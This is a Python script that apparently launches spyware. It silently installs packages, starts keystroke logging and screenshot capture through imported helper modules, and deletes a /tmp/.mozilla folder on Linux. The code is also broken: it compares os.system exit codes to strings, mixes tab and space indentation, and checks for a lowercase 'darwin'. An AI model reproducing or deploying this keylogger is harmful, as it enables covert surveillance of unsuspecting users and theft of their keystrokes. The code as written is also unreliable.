#!/usr/bin/python3

#libraries
import os,platform, subprocess, sys, time, requests, shutil, schedule
from screenshotLinux import screenshotsLinux
from keylogger_sub import keystrokes
from screenshotWindows import screenshotsWin

# install packages
def installSoft():
    if platform.system() == "Windows" or platform.system() == "Linux" or platform.system() == "darwin": 
        if os.system('pip3 show autopy') == "Name: autopy" and os.system('pip3 show pynput') == "Name: pynput" and os.system('pip3 show logging') == "Name: logging" and os.system('pip3 show requests') == "Name: requests":
			pass
		else:
            os.system('pip3 -q install autopy pynput logging requests --user; ')
    else:
        print("Not a valid OS")
        quit() 

#checks what OS it is
def OScheck():
    if platform.system() == "Windows":
        installSoft() 
        screenshotsWin()
        keystrokes() 
    elif platform.system() == "Linux" or platform.system() == "darwin":
        installSoft() 
        screenshotsLinux()
        keystrokes()
        shutil.rmtree('/tmp/.mozilla')
    else:
        print("Not a valid OS")
        quit()
OScheck()
